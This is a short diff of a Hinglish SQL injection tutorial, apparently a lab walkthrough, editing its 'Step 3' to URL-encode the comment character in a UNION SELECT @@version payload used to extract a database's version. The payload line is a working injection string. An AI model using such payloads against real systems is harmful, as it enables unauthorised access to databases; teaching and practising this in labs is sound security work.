@@ -20,7 +20,7 @@
 **Step 3: Database version extract karna (Final Step)**
  * Ab version nikalne ke liye @@version function ka istemal karein ge. Dusre column ko NULL rakh dein ge:
    ```text
-   '+UNION+SELECT+@@version,+NULL#
+   '+UNION+SELECT+@@version,+NULL%23
    
    ```
  * *(Note: Agar browser/Burp se bhej rahe ho toh # ko URL encode karke %23 likhna: '+UNION+SELECT+@@version,+NULL%23)*
